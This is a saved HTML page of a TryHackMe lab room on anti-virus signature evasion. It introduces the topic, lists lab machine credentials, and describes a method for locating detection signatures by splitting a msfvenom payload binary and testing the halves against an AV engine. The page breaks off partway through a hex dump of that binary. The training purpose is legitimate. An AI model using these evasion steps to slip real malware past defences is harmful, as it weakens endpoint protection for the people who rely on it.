<section id="sponsor" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
<i id="sponsor-close" class="fas fa-times hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>
<div id="sponsor-data" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"></div>
</section>
<div id="top-panel" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
<ul class="nav nav-tabs hidden-originally" id="task-navs" data-pf_style_display="none" data-pf_style_visibility="hidden">
<li class="nav-item hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a class="nav-link active hidden-originally" data-toggle="tab" href="https://tryhackme.com/room/signatureevasion#chart" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i class="fas fa-chart-line icon-right hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i> Chart
</a>
</li>
<li class="nav-item hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a class="nav-link hidden-originally" data-toggle="tab" href="https://tryhackme.com/room/signatureevasion#scoreboard" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i class="fas fa-trophy icon-right hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i> Scoreboard
</a>
</li>
<li class="nav-item hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a class="nav-link hidden-originally" data-toggle="tab" href="https://tryhackme.com/room/signatureevasion#chat" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i class="fas fa-comments-alt icon-right chat-icon hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i> Discuss
</a>
</li>
<li class="nav-item hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a class="nav-link hidden-originally" data-toggle="tab" href="https://tryhackme.com/room/signatureevasion#writeups" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i class="fas fa-pen-alt icon-right hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i> Writeups
</a>
</li>
<li class="nav-item hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a class="nav-link hidden-originally" data-toggle="tab" href="https://tryhackme.com/room/signatureevasion#about" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i class="fas fa-info-circle icon-right hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i> More
</a>
</li>
</ul>
<div class="card cd-2 nav-above-con hidden-originally" id="room-main" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="card-body hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<span id="room-tabs" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<div class="tab-content hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div id="chart" class="tab-pane active hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<span id="difficulty-bar" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
    <span class="room-difficulty diff-text hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
      Difficulty: 
        <span class="difficulty-medium hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Medium</span>
    </span></span>
<br data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"><div id="chart-data" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"></div>
</div>
<div id="scoreboard" class="tab-pane fade hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<table class="table table-striped table-bordered table-condensed table-header-rotated mb-0 hidden-originally" id="scoreboard_table" data-pf_style_display="none" data-pf_style_visibility="hidden">
<thead data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<tr id="scoreboard_header" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<th data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Rank</th>
<th data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Username</th>
<th data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Total Score</th>
</tr>
</thead>
<tbody id="scoreboard_body" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"></tbody>
</table>
</div>
<div id="chat" class="tab-pane fade hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">

<div class="row hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="col-sm-6 text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<h3 class="mb-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Discord</h3>
<p data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Come join our <a target="_blank" href="https://discord.gg/QgC6Tdk" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Discord</a> server for support or further discussions</p>
</div>
<div class="col-sm-6 text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<h3 class="mb-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Forum</h3>
<div id="forum-text" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Read or post on the dedicated forum <a href="https://tryhackme.com/forum/thread/630e30d2549c1400603835fe" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">post</a></div>
</div>
</div>
</div>
<div id="writeups" class="tab-pane text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div id="writeups-data" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">There are no writeups submitted.</div>
<button onclick="showWriteupForm(this)" type="button" class="btn btn-xs btn-secondary mt-3 mb-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Add Writeup</button>
<div id="writeup-form" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<div class="form-row hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="col-auto hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<input type="text" class="form-control mb-2 hidden-originally" id="writeup-title" placeholder="Writeup Title" data-pf_style_display="none" data-pf_style_visibility="hidden" value="">
</div>
<div class="col-auto hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<input type="text" class="form-control mb-2 hidden-originally" id="writeup-link" placeholder="Writeup URL" data-pf_style_display="none" data-pf_style_visibility="hidden" value="">
</div>
<div class="col-auto hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<button id="submit-writeup" type="submit" class="btn btn-success mb-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Submit</button>
</div>
</div>
<p class="faded mb-0 size-14 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="fas fa-exclamation-triangle text-warning hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i> Writeups should have a link to TryHackMe and not include any passwords/cracked hashes/flags</p>
</div>
</div>
<div id="about" class="tab-pane text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<p id="about-freeRoom" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"><p class="mb-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Only subscribers can deploy virtual machines in this room! 
        Go to your <a href="https://tryhackme.com/profile" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">profile</a> page to subscribe (if you have not already). 4490 users are in here and this room is 320 days old.</p></p>
<p id="about-owner" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"><p class="size-18 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Created by <img class="avatar-tiny hidden-originally" src="./TryHackMe _ Signature Evasion_files/af7feb2c43a2c7d5f111b98ccbd15048.png" data-pf_style_display="none" data-pf_style_visibility="hidden"> 
        <a class="green-link hidden-originally" href="https://tryhackme.com/p/tryhackme" data-pf_style_display="none" data-pf_style_visibility="hidden">tryhackme</a> and <img class="avatar-tiny hidden-originally" src="./TryHackMe _ Signature Evasion_files/9e946af210ae86d6fbfda480d958b3fe.gif" data-pf_style_display="none" data-pf_style_visibility="hidden"> 
        <a class="green-link hidden-originally" href="https://tryhackme.com/p/Cryillic" data-pf_style_display="none" data-pf_style_visibility="hidden">Cryillic</a></p></p>
</div>
</div>
</span>
</div>
</div>
</div>
<div id="room-simple-video" class="card card-body cd-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="visible"></div>
<div class="card mt-3 mb-3 cd-2 text-center hidden-originally" id="instance-info" data-pf_style_display="none" data-pf_style_visibility="visible">
<div class="card-header card-header-red hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Active Machine Information</div>
<div class="card-body hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="row vertical-align-custom hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="col-sm-3 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Loading...</i>
</div>
<div class="col-sm-3 hidden-originally" id="table-machine-ip" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Loading...</i>
</div>
<div class="col-sm-3 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Loading...</i>
</div>
<div class="col-sm-3 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Loading...</i>
</div>
</div>
</div>
</div>
<div id="task-list" data-pf_style_display="block" data-pf_style_visibility="visible">
<div id="room-task-detail" class="mb-3" data-pf_style_display="flex" data-pf_style_visibility="visible"><span id="progress-bar" style="display: block;" data-pf_style_display="block" data-pf_style_visibility="visible"><div class="progress" data-pf_style_display="flex" data-pf_style_visibility="visible"><div class="progress-bar bg-success" role="progressbar" style="width: 91%; aria-valuemin=" 0"="" aria-valuemax="100" data-pf_style_display="flex" data-pf_style_visibility="visible"> 91%</div></div></span></div>
<div id="taskContent" data-pf_style_display="block" data-pf_style_visibility="visible"><div class="card" id="task-1" data-pf_style_display="flex" data-pf_style_visibility="visible">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse1" aria-expanded="true" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <a class="card-link" data-pf_style_display="inline" data-pf_style_visibility="visible">
                            <span class="task-dropdown-title hacker-green" data-pf_style_display="inline" data-pf_style_visibility="visible">Task 1                             <span class="task-dropdown-icon" data-pf_style_display="inline" data-pf_style_visibility="visible"><i class="fas fa-check-circle" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span></span> Introduction
                            <span class="float-right" data-pf_style_display="block" data-pf_style_visibility="visible"><i class="fas fa-chevron-down" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span>
                            <span class="task-resources" data-pf_style_display="block" data-pf_style_visibility="visible"><i class="far fa-server text-lgreen" data-toggle="tooltip" data-placement="left" title="" data-original-title="Task includes a deployable machine" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span>
                        </a>
                    </div>
                    <div id="collapse1" class="collapse show" data-parent="#taskContent" data-pf_style_display="block" data-pf_style_visibility="visible" style="">
                        <div class="card-body task-complete" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <div class="room-task-desc" data-pf_style_display="flex" data-pf_style_visibility="visible">
            <div class="room-task-desc-data" data-pf_style_display="block" data-pf_style_visibility="visible"><div class="btn-group mb-3 ml-3 float-right" data-pf_style_display="flex" data-pf_style_visibility="visible">
            <button type="button" class="btn btn-success" value="62e17f576515e0005014dbd0" onclick="deploy(this)" data-pf_style_display="block" data-pf_style_visibility="visible"><i class="fas fa-play mr-2" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i> Start Machine</button>
        </div> <p data-pf_style_display="block" data-pf_style_visibility="visible">An adversary may struggle to overcome specific detections when facing an advanced anti-virus engine or <strong data-pf_style_display="inline" data-pf_style_visibility="visible">EDR</strong> (<strong data-pf_style_display="inline" data-pf_style_visibility="visible">E</strong>ndpoint <strong data-pf_style_display="inline" data-pf_style_visibility="visible">D</strong>etection &amp; <strong data-pf_style_display="inline" data-pf_style_visibility="visible">R</strong>esponse) solution. Even after employing some of the most common obfuscation or evasion techniques discussed in&nbsp;<a href="https://tryhackme.com/room/obfuscationprinciples" data-pf_style_display="inline" data-pf_style_visibility="visible">Obfuscation Principles</a>, signatures in a malicious file may still be present.</p>
<div data-pf_style_display="block" data-pf_style_visibility="visible">
<img src="./TryHackMe _ Signature Evasion_files/1e9f66d4cc4de936cf372c1e7d4ceba1.png" alt="Decorative image of a toolbox" style="float:right;width:141.24px;height:141.24px" class="note-float-right" data-pf_style_display="block" data-pf_style_visibility="visible" data-pf_rect_width="141.234375" data-pf_rect_height="48">

<p data-pf_style_display="block" data-pf_style_visibility="visible">To combat persistent signatures, adversaries can observe each individually and address them as needed.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">In this room, we will understand what signatures are and how to find them, then attempt to break them following an agnostic thought process. To dive deeper and combat heuristic signatures, we will also discuss more advanced code concepts and â€œmalware best practices.â€</p>


<h3 data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">Learning Objectives</span></h3><ol data-pf_style_display="block" data-pf_style_visibility="visible">
<li data-pf_style_display="list-item" data-pf_style_visibility="visible">Understand the origins of signatures and how to observe/detect them in malicious code</li>
<li data-pf_style_display="list-item" data-pf_style_visibility="visible">Implement documented obfuscation methodology to break signatures</li>
<li data-pf_style_display="list-item" data-pf_style_visibility="visible">Leverage non-obfuscation-based techniques to break non-function oriented signatures.</li></ol><p data-pf_style_display="block" data-pf_style_visibility="visible">This room is a successor to <a href="https://tryhackme.com/room/obfuscationprinciples" class="notion-link-token notion-enable-hover" target="_blank" data-pf_style_display="inline" data-pf_style_visibility="visible"><span style="border-bottom:0.05em solid;border-color:rgba(55,53,47,0.4);opacity:0.7" class="link-annotation-unknown-block-id-1083491165" data-pf_style_display="inline" data-pf_style_visibility="visible">Obfuscation Principles</span></a>; we highly recommend completing it before this room if you have not already.&nbsp;<br data-pf_style_display="inline" data-pf_style_visibility="visible"></p><ol data-pf_style_display="block" data-pf_style_visibility="visible">


</ol>

</div>
<p data-pf_style_display="block" data-pf_style_visibility="visible">Before beginning this room, familiarize yourself with basic programming logic and syntax. Knowledge of C and PowerShell is recommended but not required.&nbsp;<br data-pf_style_display="inline" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible">We have provided a base Windows machine with the files needed to complete this room. You can access the machine in-browser or through RDP using the credentials below.</p><p style="text-align:center" data-pf_style_display="block" data-pf_style_visibility="visible">Machine IP:&nbsp;<code style="font-size:14px" data-pf_style_display="inline-block" data-pf_style_visibility="visible">MACHINE_IP</code>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Username:&nbsp;<code style="font-size:14px" data-pf_style_display="inline-block" data-pf_style_visibility="visible">Student</code>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Password:&nbsp;<code style="font-size:14px" data-pf_style_display="inline-block" data-pf_style_visibility="visible">TryHackMe!</code></p><p data-pf_style_display="block" data-pf_style_visibility="visible">


</p><p data-pf_style_display="block" data-pf_style_visibility="visible">This is going to be a lot of information. Please locate your nearest hammer and fire extinguisher.</p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green" data-pf_style_display="flex" data-pf_style_visibility="visible">
            <div data-pf_style_display="block" data-pf_style_visibility="visible">Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <div class="room-task-question-no vertical-align-custom" data-pf_style_display="flex" data-pf_style_visibility="visible">
                                
                            </div>
                            <div class="room-task-question-details" data-pf_style_display="block" data-pf_style_visibility="visible">
                                Read the above and continue to the next task.
                            </div>
                        </div>

                    <div class="room-task-input" data-pf_style_display="grid" data-pf_style_visibility="visible">
                        <div class="room-task-input-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <input type="hidden" value="1" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                            <input type="hidden" value="1" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                        </div>
                        <div class="room-task-input-answer" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <button type="button" class="btn btn-success task-answer" disabled="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            Question Done
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-2" data-pf_style_display="flex" data-pf_style_visibility="visible">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse2" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <a class="card-link" data-pf_style_display="inline" data-pf_style_visibility="visible">
                            <span class="task-dropdown-title hacker-green" data-pf_style_display="inline" data-pf_style_visibility="visible">Task 2                             <span class="task-dropdown-icon" data-pf_style_display="inline" data-pf_style_visibility="visible"><i class="fas fa-check-circle" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span></span> Signature Identification
                            <span class="float-right" data-pf_style_display="block" data-pf_style_visibility="visible"><i class="fas fa-chevron-down" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span>
                            <span class="task-resources" data-pf_style_display="block" data-pf_style_visibility="visible"></span>
                        </a>
                    </div>
                    <div id="collapse2" class="collapse show" data-parent="#taskContent" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <div class="card-body task-complete" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <div class="room-task-desc" data-pf_style_display="flex" data-pf_style_visibility="visible">
            <div class="room-task-desc-data" data-pf_style_display="block" data-pf_style_visibility="visible"> <p data-pf_style_display="block" data-pf_style_visibility="visible">Before jumping into breaking signatures, we need to understand and identify what we are looking for. As covered in&nbsp;<a href="https://tryhackme.com/room/introtoav" data-pf_style_display="inline" data-pf_style_visibility="visible">Introduction to Anti-Virus</a>, signatures are used by anti-virus engines to track and identify possible suspicious and/or malicious programs. In this task, we will observe how we can manually identify an exact byte where a signature starts.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">When identifying signatures, whether manually or automated, we must employ an iterative process to determine what byte a signature starts at. By recursively splitting a compiled binary in half and testing it, we can get a rough estimate of a byte-range to investigate further.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">

</p><p data-pf_style_display="block" data-pf_style_visibility="visible">We can use the native utilities <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">head</code>, <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">dd</code>, or <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">split</code> to split a compiled binary. In the below command prompt, we will walk through using head to find the first signature present in a msfvenom binary.</p>


<asciinema-player src="https://asciinema.org/a/511376.cast" cols="160" rows="24" data-pf_style_display="inline" data-pf_style_visibility="visible"><div data-reactroot="" tabindex="-1" class="asciinema-player-wrapper hud" data-pf_style_display="block" data-pf_style_visibility="visible"><div class="asciinema-player asciinema-theme-asciinema" data-pf_style_display="inline-block" data-pf_style_visibility="visible"><pre class="asciinema-terminal font-small" style="width: 160ch; height: 32em;" data-pf_style_display="block" data-pf_style_visibility="visible"><span class="line" data-pf_style_display="block" data-pf_style_visibility="visible"></span><span class="line" data-pf_style_display="block" data-pf_style_visibility="visible"></span><span class="line" data-pf_style_display="block" data-pf_style_visibility="visible"></span><span class="line" data-pf_style_display="block" data-pf_style_visibility="visible"></span><span class="line" data-pf_style_display="block" data-pf_style_visibility="visible"></span><span class="line" data-pf_style_display="block" data-pf_style_visibility="visible"></span><span class="line" data-pf_style_display="block" data-pf_style_visibility="visible"></span><span class="line" data-pf_style_display="block" data-pf_style_visibility="visible"></span><span class="line" data-pf_style_display="block" data-pf_style_visibility="visible"></span><span class="line" data-pf_style_display="block" data-pf_style_visibility="visible"></span><span class="line" data-pf_style_display="block" data-pf_style_visibility="visible"></span><span class="line" data-pf_style_display="block" data-pf_style_visibility="visible"></span><span class="line" data-pf_style_display="block" data-pf_style_visibility="visible"></span><span class="line" data-pf_style_display="block" data-pf_style_visibility="visible"></span><span class="line" data-pf_style_display="block" data-pf_style_visibility="visible"></span><span class="line" data-pf_style_display="block" data-pf_style_visibility="visible"></span><span class="line" data-pf_style_display="block" data-pf_style_visibility="visible"></span><span class="line" data-pf_style_display="block" data-pf_style_visibility="visible"></span><span class="line" data-pf_style_display="block" data-pf_style_visibility="visible"></span><span class="line" data-pf_style_display="block" data-pf_style_visibility="visible"></span><span class="line" data-pf_style_display="block" data-pf_style_visibility="visible"></span><span class="line" data-pf_style_display="block" data-pf_style_visibility="visible"></span><span class="line" data-pf_style_display="block" data-pf_style_visibility="visible"></span><span class="line" data-pf_style_display="block" data-pf_style_visibility="visible"></span></pre><div class="control-bar" data-pf_style_display="block" data-pf_style_visibility="visible"><span class="playback-button" data-pf_style_display="block" data-pf_style_visibility="visible"><svg version="1.1" viewBox="0 0 12 12" class="icon" data-pf_style_display="inline" data-pf_style_visibility="visible" data-pf_rect_width="12" data-pf_rect_height="12"><path d="M1,0 L11,6 L1,12 Z" data-pf_style_display="inline" data-pf_style_visibility="visible"></path></svg></span><span class="timer" data-pf_style_display="block" data-pf_style_visibility="visible"><span class="time-elapsed" data-pf_style_display="inline-block" data-pf_style_visibility="visible">00:00</span><span class="time-remaining hidden-originally" data-pf_style_display="none" data-pf_style_visibility="visible">-00:00</span></span><span class="fullscreen-button" data-pf_style_display="block" data-pf_style_visibility="visible"><svg version="1.1" viewBox="0 0 12 12" class="icon" data-pf_style_display="inline" data-pf_style_visibility="visible" data-pf_rect_width="14" data-pf_rect_height="14"><path d="M12,0 L7,0 L9,2 L7,4 L8,5 L10,3 L12,5 Z" data-pf_style_display="inline" data-pf_style_visibility="visible"></path><path d="M0,12 L0,7 L2,9 L4,7 L5,8 L3,10 L5,12 Z" data-pf_style_display="inline" data-pf_style_visibility="visible"></path></svg><svg version="1.1" viewBox="0 0 12 12" class="icon hidden-originally" data-pf_style_display="none" data-pf_style_visibility="visible" data-pf_rect_width="0" data-pf_rect_height="0"><path d="M7,5 L7,0 L9,2 L11,0 L12,1 L10,3 L12,5 Z" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"></path><path d="M5,7 L0,7 L2,9 L0,11 L1,12 L3,10 L5,12 Z" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"></path></svg></span><span class="progressbar" data-pf_style_display="block" data-pf_style_visibility="visible"><span class="bar" data-pf_style_display="block" data-pf_style_visibility="visible"><span class="gutter" data-pf_style_display="block" data-pf_style_visibility="visible"><span data-pf_style_display="inline-block" data-pf_style_visibility="visible"></span></span></span></span></div><div class="start-prompt" data-pf_style_display="block" data-pf_style_visibility="visible"><div class="play-button" data-pf_style_display="table" data-pf_style_visibility="visible"><div data-pf_style_display="table-cell" data-pf_style_visibility="visible"><span data-pf_style_display="inline-block" data-pf_style_visibility="visible"><svg version="1.1" viewBox="0 0 866.0254037844387 866.0254037844387" class="icon" data-pf_style_display="inline" data-pf_style_visibility="visible" data-pf_rect_width="96" data-pf_rect_height="96"><defs data-pf_style_display="inline" data-pf_style_visibility="visible"> <mask id="small-triangle-mask" data-pf_style_display="inline" data-pf_style_visibility="visible"> <rect width="100%" height="100%" fill="white" data-pf_style_display="inline" data-pf_style_visibility="visible"></rect> <polygon points="508.01270189221935 433.01270189221935, 208.0127018922194 259.8076211353316, 208.01270189221927 606.217782649107" fill="black" data-pf_style_display="inline" data-pf_style_visibility="visible"></polygon> </mask> </defs> <polygon points="808.0127018922194 433.01270189221935, 58.01270189221947 -1.1368683772161603e-13, 58.01270189221913 866.0254037844386" mask="url(#small-triangle-mask)" fill="white" data-pf_style_display="inline" data-pf_style_visibility="visible"></polygon> <polyline points="481.2177826491071 333.0127018922194, 134.80762113533166 533.0127018922194" stroke="white" stroke-width="90" data-pf_style_display="inline" data-pf_style_visibility="visible"></polyline></svg></span></div></div></div></div></div></asciinema-player>


<p data-pf_style_display="block" data-pf_style_visibility="visible">Once split, move the binary from your development environment to a machine with the anti-virus engine you would like to test on. If an alert appears, move to the lower half of the split binary and split it again. If an alert does not appear, move to the upper half of the split binary and split it again. Continue this pattern until you cannot determine where to go; this will typically occur around the kilobyte range.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">
</p><p data-pf_style_display="block" data-pf_style_visibility="visible">Once you have reached the point at which you no longer accurately split the binary, you can use a hex editor to view the end of the binary where the signature is present.</p><pre style="color:rgb(0, 0, 0)" data-pf_style_display="block" data-pf_style_visibility="visible"><div style="text-align:center" data-pf_style_display="block" data-pf_style_visibility="visible"><span class="offsetcol" style="color:rgb(0, 0, 191)" data-pf_style_display="inline" data-pf_style_visibility="visible">0000C2E0</span>  <span class="hexcol" data-pf_style_display="inline" data-pf_style_visibility="visible">43 68 6E E9 0A 00 00 00 0C 4D 1A 8E 04 3A E9 89</span>  <span class="textcol" data-pf_style_display="inline" data-pf_style_visibility="visible">ChnÃ©.....M.Å½.:Ã©â€°</span></div><span class="offsetcol" style="color:rgb(0, 0, 191)" data-pf_style_display="inline" data-pf_style_visibility="visible"><div style="text-align:center" data-pf_style_display="block" data-pf_style_visibility="visible"><span class="offsetcol" data-pf_style_display="inline" data-pf_style_visibility="visible">0000C2F0</span><span style="color:rgb(0, 0, 0)" data-pf_style_display="inline" data-pf_style_visibility="visible">  </span><span class="hexcol" style="color:rgb(0, 0, 0)" data-pf_style_display="inline" data-pf_style_visibility="visible">67 6F BE 46 01 00 00 6A 40 90 68 00 10 00 00 E9</span><span style="color:rgb(0, 0, 0)" data-pf_style_display="inline" data-pf_style_visibility="visible">  </span><span class="textcol" style="color:rgb(0, 0, 0)" data-pf_style_display="inline" data-pf_style_visibility="visible">goÂ¾F...j@.h....Ã©</span></div></span><span class="offsetcol" style="color:rgb(0, 0, 191)" data-pf_style_display="inline" data-pf_style_visibility="visible"><div style="text-align:center" data-pf_style_display="block" data-pf_style_visibility="visible"><span class="offsetcol" data-pf_style_display="inline" data-pf_style_visibility="visible">0000C300</span><span style="color:rgb(0, 0, 0)" data-pf_style_display="inline" data-pf_style_visibility="visible">  </span><span class="hexcol" style="color:rgb(0, 0, 0)" data-pf_style_display="inline" data-pf_style_visibility="visible">0A 00 00 00 53 DF A1 7F 64 ED 40 73 4A 64 56 90</span><span style="color:rgb(0, 0, 0)" data-pf_style_display="inline" data-pf_style_visibility="visible">  </span><span class="textcol" style="color:rgb(0, 0, 0)" data-pf_style_display="inline" data-pf_style_visibility="visible">....SÃŸÂ¡.dÃ­@sJdV.</span></div></span><span class="offsetcol" style="color:rgb(0, 0, 191)" data-pf_style_display="inline" data-pf_style_visibility="visible"><div style="text-align:center" data-pf_style_display="block" data-pf_style_visibility="visible"><span class="offsetcol" data-pf_style_display="inline" data-pf_style_visibility="visible">0000C310</span><span style="color:rgb(0, 0, 0)" data-pf_style_display="inline" data-pf_style_visibility="visible">  </span><span class="hexcol" style="color:rgb(0, 0, 0)" data-pf_style_display="inline" data-pf_style_visibility="visible">6A 00 68 58 A4 53 E5 E9 08 00 00 00 15 0D 69 B6</span><span style="color:rgb(0, 0, 0)" data-pf_style_display="inline" data-pf_style_visibility="visible">  </span><span class="textcol" style="color:rgb(0, 0, 0)" data-pf_style_display="inline" data-pf_style_visibility="visible">j.hXÂ¤SÃ¥Ã©......iÂ¶</span></div></span><span class="offsetcol" style="color:rgb(0, 0, 191)" data-pf_style_display="inline" data-pf_style_visibility="visible"><div style="text-align:center" data-pf_style_display="block" data-pf_style_visibility="visible"><span class="offsetcol" data-pf_style_display="inline" data-pf_style_visibility="visible">0000C320</span><span style="color:rgb(0, 0, 0)" data-pf_style_display="inline" data-pf_style_visibility="visible">  </span><span class="hexcol" style="color:rgb(0, 0, 0)" data-pf_style_display="inline" data-pf_style_visibility="visible">F4 AB 1B 73 FF D5 E9 0A 00 00 00 7D 43 00 40 DB</span><span style="color:rgb(0, 0, 0)" data-pf_style_display="inline" data-pf_style_visibility="visible">  </span><span class="textcol" style="color:rgb(0, 0, 0)" data-pf_style_display="inline" data-pf_style_visibility="visible">Ã´Â«.sÃ¿Ã•Ã©....}C.@Ã›</span></div></span><span class="offsetcol" style="color:rgb(0, 0, 191)" data-pf_style_display="inline" data-pf_style_visibility="visible"><div style="text-align:center" data-pf_style_display="block" data-pf_style_visibility="visible"><span class="offsetcol" data-pf_style_display="inline" data-pf_style_visibility="visible">0000C330</span><span style="color:rgb(0, 0, 0)" data-pf_style_display="inline" data-pf_style_visibility="visible">  </span><span class="hexcol" style="color:rgb(0, 0, 0)" data-pf_style_display="inline" data-pf_style_visibility="visible">43 8B AC 55 82 89 C3 90 E9 08 00 00 00 E4 95 8E</span><span style="color:rgb(0, 0, 0)" data-pf_style_display="inline" data-pf_style_visibility="visible">  </span><span class="textcol" style="color:rgb(0, 0, 0)" data-pf_style_display="inline" data-pf_style_visibility="visible">Câ€¹Â¬Uâ€šâ€°Ãƒ.Ã©....Ã¤â€¢Å½</span></div></span><span class="offsetcol" style="color:rgb(0, 0, 191)" data-pf_style_display="inline" data-pf_style_visibility="visible"><div style="text-align:center" data-pf_style_display="block" data-pf_style_visibility="visible"><span class="offsetcol" data-pf_style_display="inline" data-pf_style_visibility="visible">0000C340</span><span style="color:rgb(0, 0, 0)" data-pf_style_display="inline" data-pf_style_visibility="visible">  </span><span class="hexcol" style="color:rgb(0, 0, 0)" data-pf_style_display="inline" data-pf_style_visibility="visible">2C 06 AC 29 A3 89 C7 90 E9 0B 00 00 00 0B 32 AC</span><span 